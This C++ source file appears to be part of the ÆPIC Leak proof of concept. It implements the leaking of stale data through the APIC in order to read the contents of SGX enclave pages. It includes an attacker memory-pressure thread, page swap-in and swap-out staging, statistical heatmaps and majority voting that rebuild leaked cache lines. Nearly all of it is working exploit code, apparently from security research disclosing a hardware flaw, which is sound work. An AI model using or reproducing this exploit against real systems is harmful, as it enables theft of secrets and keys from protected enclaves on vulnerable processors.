#include "aepic_leak.h"

#include "aepic_interface.h"
#include "utils.h"

#include <sys/mman.h>

signal_t stride_ready;
signal_t pressure_done;

std::atomic<uint64_t> stride      = 0;
std::atomic<bool>     do_pressure = false;
std::atomic<bool>     running     = true;

// accumulate in the heatmap
void analyze_leak(leak_t const &leaked, heatmap_t &heatmap) {
    for ( cache_line_t const &line : leaked ) {
        for ( size_t c = 0; c < APIC_LEAK_MAX; ++c ) {
            leaked_value_t l = line[c];

            if ( heatmap.counts[c][l]++ == 0 ) {
                heatmap.values[c].push_back(l);
            }

            heatmap.counts[c][l]++;
        }
    }
}

// check if we see a string like `0a-f`
bool is_leak_string(char const *str) {
    auto in_range = [](char x) {
        return ('0' <= x && x <= '9') || ('a' <= x && x <= 'f');
    };
    return in_range(str[0]) && in_range(str[1]) && str[2] == '+' && in_range(str[3]);
}

// nice printing
void print_4bytes(char const *s, bool is_diff, bool readable) {
    char const *format = readable ? "%s%s%c%c%c%c%s|" : "%s%s%02x%02x%02x%02x%s|";

    auto cvt = [&](char c) -> unsigned char {
        if ( !readable ) {
            return c;
        }

        if ( c == 0x0 )
            return '.';
        if ( isprint(c) )
            return c;
        return '_';
    };
    printf(format, is_leak_string(s) ? COLOR_RED : "", is_diff ? COLOR_YELLOW : "", cvt(s[0]), cvt(s[1]), cvt(s[2]),
           cvt(s[3]), COLOR_RESET);
}

// print line
void print_line(cache_line_t const &l, bool highlight, bool readable) {
    print_line_paritally(0, l.size(), l, highlight, readable);
}

void print_line_paritally(size_t start, size_t end, cache_line_t const &l, bool highlight, bool readable) {
    for ( size_t i = start; i < end; ++i ) {
        print_4bytes((char *)&l[i], highlight, readable);
    }
    printf("\n");
}

// partially sort each column of the heatmap
scores_t process_heatmap(heatmap_t &heatmap, size_t n_maxima) {

    scores_t scores;
    scores.resize(n_maxima);

    for ( size_t c = 0; c < APIC_LEAK_MAX; ++c ) {

        size_t N = heatmap.values[c].size() < n_maxima ? heatmap.values[c].size() : n_maxima;

        std::partial_sort(heatmap.values[c].begin(), heatmap.values[c].begin() + N, heatmap.values[c].end(),
                          [&](leaked_value_t const x, leaked_value_t const y) {
                              return heatmap.counts[c][x] >= heatmap.counts[c][y];
                          });

        for ( size_t i = 0; i < N; ++i ) {
            size_t count     = heatmap.counts[c][heatmap.values[c][i]];
            size_t max_count = heatmap.counts[c][heatmap.values[c][0]];

            scores[i] += count / (double)max_count / APIC_LEAK_MAX * 100.0;
        }
    }

    return scores;
}

// visualize the heatmap including the diff
void print_heatmap(heatmap_t const &heatmap, heatmap_diff_t const &diff, scores_t const &scores, bool readable) {

    for ( size_t row = 0; row < scores.size(); ++row ) {
        CLEAR_LINE();
        printf("%2ld: ", row);
        for ( size_t col = 0; col < APIC_LEAK_MAX; ++col ) {

            if ( APIC_LEAK_MAX != LEAKED_VALUES_PER_LINE && col % 3 == 0 ) {
                print_4bytes("xxxx", false, readable);
            }

            print_4bytes((char *)&heatmap.values[col][row], diff[col].contains(heatmap.values[col][row]), readable);
        }
        printf("→ score: %7.3f %%\n", scores[row]);
    }
}

// get a diff from the last heatmap
heatmap_diff_t diff_heatmap(heatmap_t const &x, heatmap_t const &y, size_t n_maxima) {
    heatmap_diff_t diff;

    for ( size_t col = 0; col < APIC_LEAK_MAX; ++col ) {
        std::set<leaked_value_t> sx, sy;

        for ( size_t row = 0; row < n_maxima; ++row ) {
            if ( row < x.values[col].size() ) {
                sx.insert(x.values[col][row]);
            }
            if ( row < y.values[col].size() ) {
                sy.insert(y.values[col][row]);
            }
        }

        // this would give us the old once too
        // std::set_difference(sx.begin(), sx.end(), sy.begin(), sy.end(), std::inserter(diff[col],
        // diff[col].end()));

        // we only want the new elements
        std::set_difference(sy.begin(), sy.end(), sx.begin(), sx.end(), std::inserter(diff[col], diff[col].end()));
    }

    return diff;
}

void print_diff(heatmap_t const &heatmap, heatmap_diff_t const &diff, scores_t const &scores, double threshold,
                bool readable) {

    for ( size_t row = 0; row < scores.size(); ++row ) {
        if ( scores[row] < threshold ) {
            continue;
        }

        bool contains_diff = false;
        for ( size_t col = 0; col < APIC_LEAK_MAX; ++col ) {
            contains_diff |= diff[col].contains(heatmap.values[col][row]);
        }
        if ( !contains_diff ) {
            continue;
        }

        CLEAR_LINE();
        printf("%2ld: ", row);
        for ( size_t col = 0; col < APIC_LEAK_MAX; ++col ) {

            if ( APIC_LEAK_MAX != LEAKED_VALUES_PER_LINE && col % 3 == 0 ) {
                print_4bytes("xxxx", false, readable);
            }

            print_4bytes((char *)&heatmap.values[col][row], diff[col].contains(heatmap.values[col][row]), readable);
        }
        printf("→ score: %7.3f %%\n", scores[row]);
    }
}

void print_sgx_page(char *page, bool readable) {
    char target[4096];
    aepic_edbgrd(page, target, 4096);

    CLEAR_LINE();
    printf("%p:\n", page);
    for ( size_t cl = 0; cl < 64; ++cl ) {
        printf("%2lx: ", cl);
        for ( size_t bb = 0; bb < 16; ++bb ) {
            char *p = target + cl * 64 + bb * 4;
            print_4bytes(p, false, readable);
        }
        printf("\n");
    }
}

void print_sgx_page_line(char *page, size_t line, bool readable) {
    char target[64];
    aepic_edbgrd(page + line * 64, target, 64);

    CLEAR_LINE();
    printf("debug   %2lx → ", line);
    for ( size_t bb = 0; bb < 16; ++bb ) {
        char *p = target + bb * 4;
        print_4bytes(p, false, readable);
    }
    printf("\n");
}

// get best leaked diff value
leaked_value_t best_diff_value(int col, heatmap_t const &heatmap, heatmap_diff_t const &diff, scores_t const &scores) {

    for ( size_t row = 0; row < scores.size(); ++row ) {
        if ( !diff[col].contains(heatmap.values[col][row]) ) {
            continue;
        }
        return heatmap.values[col][row];
    }

    return 0;
}

// fill line from best diff values
cache_line_t fill_line(heatmap_t const &heatmap, heatmap_diff_t const &diff, scores_t const &scores) {
    cache_line_t     result   = {};
    constexpr size_t perm[12] = { 1, 2, 3, 5, 6, 7, 9, 10, 11, 13, 14, 15 };

    for ( size_t col = 0; col < APIC_LEAK_MAX; ++col ) {
        result[perm[col]] = best_diff_value(col, heatmap, diff, scores);
    }

    return result;
}

static void flush(void *p) {
    asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

static void maccess(void *p) {
    asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

void *attacker_memory_pressure(void *punused) {
    set_cpu_mask(1llu << ATTACKER_MEMORY_PRESSURE);

    size_t size = 256 * 0x1000;

    uint8_t *backing =
        (uint8_t *)mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

    memset(backing, 0, size);

    /*for ( size_t i = 0; i < size; i += 64 ) {
        backing[i + 32] = 1;
    }*/

    while ( running ) {

        stride_ready.wait();
        int local_stride = stride;

        while ( do_pressure && running ) {
            for ( size_t i = 0; i < size; i += 0x1000 ) {
                // backing[i + local_stride]++;
                maccess(&backing[i + local_stride]);
                // backing[i + local_stride] = 0;
                // flush(&backing[i + local_stride]);
            }
        }

        pressure_done.signal();
    }
    return NULL;
}

leak_t kernel_leak(uint64_t pid, char *base, size_t offset) {
    leak_t leaked = {};

    if ( pid != 0 ) {
        leaked[1] = aepic_swap_page_out_pid(pid, base, base + offset);
        leaked[0] = aepic_swap_page_in_pid(pid, base, base + offset);
    }
    else {
        // bit faster
        leaked[1] = aepic_swap_page_out(base + offset);
        leaked[0] = aepic_swap_page_in(base + offset);
    }

    return leaked;
}

cache_line_t leak_line(uint64_t pid, char *base, uint64_t offset, size_t line) {
    heatmap_t reference_page {};
    heatmap_t target_page {};

    stride      = (line * 64);
    do_pressure = true;

    stride_ready.signal();

    for ( size_t i = 0; i < NUMBER_INNER_LEAKS; ++i ) {
        analyze_leak(kernel_leak(pid, base, offset == 0 ? 0x1000 : 0), reference_page);
        analyze_leak(kernel_leak(pid, base, offset), target_page);
    }

    do_pressure = false;
    pressure_done.wait();

    heatmap_diff_t diff   = diff_heatmap(reference_page, target_page, N_MAXIMA);
    scores_t       scores = process_heatmap(target_page, N_MAXIMA);

    return fill_line(target_page, diff, scores);
}

cache_line_t leak_line_zero(uint64_t pid, char *base, uint64_t offset, size_t line) {
    std::array<cache_line_t, NUMBER_OUTER_LEAKS> leaks = {};

    for ( auto &l : leaks ) {
        l = leak_line(pid, base, offset, line);
    }

    cache_line_t final = {};

    for ( size_t i = 0; i < LEAKED_VALUES_PER_LINE; ++i ) {
        std::map<leaked_value_t, size_t> m;

        for ( auto &l : leaks ) {
            m[l[i]]++;
        }

        auto it = std::max_element(m.begin(), m.end(), [](auto x, auto y) {
            return x.second < y.second;
        });

        if ( it->second > (leaks.size() + 1) / 2 ) {
            final[i] = it->first;
        }
        else {
            final[i] = 0;
        }
    }

    return final;
}

void stop_execution() {
    running = false;
    stride_ready.kill();
    pressure_done.kill();
}